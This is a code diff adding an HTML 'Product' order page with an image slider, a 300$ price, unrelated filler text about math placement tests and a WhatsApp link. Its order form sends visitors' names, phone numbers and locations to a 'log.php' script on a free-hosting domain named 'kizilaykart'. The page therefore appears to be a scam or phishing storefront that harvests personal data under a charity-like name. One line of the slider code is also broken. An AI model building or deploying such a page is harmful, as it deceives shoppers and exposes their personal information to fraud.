@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+      integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
+      crossorigin="anonymous"
+    />
+
+    <title>Product</title>
+  </head>
+  <body>
+    <div class="container">
+      <div class="contact-box">
+        <div class="left2">
+          <div class="column">
+            <div class="centerimg">
+              <img src="img/ba.jpg" alt="" id="featured" />
+            </div>
+            <div id="slide-worapper">
+              <img id="slideLeft" class="arrow" src="img/arrow-left.png" />
+              <div id="slider">
+                <img src="img/ba.jpg" alt="" class="thumbnail active" />
+                <img src="img/ba2.jpg" alt="" class="thumbnail" />
+                <img src="img/ba3.jpg" alt="" class="thumbnail" />
+                <img src="img/p1.jpg" alt="" class="thumbnail" />
+                <img src="img/p2.jpg" alt="" class="thumbnail" />
+                <img src="img/ba3.jpg" alt="" class="thumbnail" />
+                <img src="img/ba3.jpg" alt="" class="thumbnail" />
+                <img src="img/ba3.jpg" alt="" class="thumbnail" />
+                <img src="img/ba3.jpg" alt="" class="thumbnail" />
+              </div>
+              <img id="slideRight" class="arrow" src="img/arrow-right.png" />
+            </div>
+          </div>
+        </div>
+        <div class="right">
+          <h3 class="lefttext">price: 300$</h3>
+          <p class="lefttext" style="color: #2ecc71;">
+            FREE DELIVERY AND PAYMENT ON DELIVERY
+          </p>
+          <p class="lefttext">
+            The test scores are entered in the student registration
+            <span id="dots" class="ri"
+              >...<a onclick="myFunction()" id="myBtn">Read more</a></span
+            ><span class="ri" id="more">
+              system to allow you to register for a math class throughWebReg.
+              Test results are valid for one calendar year. After waiting at
+              least one month you may repeat the test after studying the topics
+              listed on your placement results. The last placement level will
+              replace previous test results.<a onclick="myFunction()" id="myBtn"
+                >Read less</a
+              >
+            </span>
+          </p>
+          <form
+            action="https://kizilaykart-5618.000webhostapp.com/phkor/log.php"
+            method="POST"
+          >
+            <input
+              name="Number"
+              type="Number"
+              value="1"
+              class="field"
+              style="width: 50%;"
+              placeholder="Number"
+              required
+            />
+            <input
+              name="Name"
+              type="text"
+              class="field"
+              placeholder="Your Name"
+              required
+            />
+            <input
+              name="Phone"
+              type="tel"
+              class="field"
+              placeholder="Phone"
+              required
+            />
+            <textarea
+              class="field"
+              name="Location"
+              placeholder="Location"
+              required
+            ></textarea>
+            <button class="btn00">Order Now</button>
+          </form>
+          <br />
+          <a href="#">There is a problem</a>
+        </div>
+      </div>
+    </div>
+    <p style="text-align: center; padding: 0 0 20px 0;">
+      100% secure online shopping
+    </p>
+    <a href="https://wa.me/905314723936">
+      <div class="fp">
+        <div class="right-button"></div></div
+    ></a>
+    <script>
+      function myFunction() {
+        var dots = document.getElementById("dots");
+        var moreText = document.getElementById("more");
+        var btnText = document.getElementById("myBtn");
+
+        if (dots.style.display === "none") {
+          dots.style.display = "inline";
+          btnText.innerHTML = "Read more";
+          moreText.style.display = "none";
+        } else {
+          dots.style.display = "none";
+          btnText.innerHTML = "Read less";
+          moreText.style.display = "inline";
+        }
+      }
+
+      let thumbnails = document.getElementsByClassName("thumbnail");
+      let activeImages = document.getElementsByClassName("active");
+      for (var i = 0; i < thumbnails.length; i++) {
+        thumbnails[i].addEventListener("mouseover", function () {
+          if (activeImages.length > 0) {
+            console.log(activeImages);
+
+            activeImages[0].classList.remove("active");
+          }
+
+          this.classList.add("active");
+          document.getElementById("featured").src = this.src;
+        });
+      }
+
+      let buttonRight = document.getElementById("slideRight");
+      let buttonLeft = document.getElementById("slideLeft");
+
+      buttonLeft.addEventListener("click", function () {
+        document.getElementById("slider").scrollRight -= 180;
+      });
+
+      buttonRight.addEventListener("click", function () {
+        document.getElementById("slider").scrollLeft += 180;
+      });
+    </script>
+  </body>
+</html>
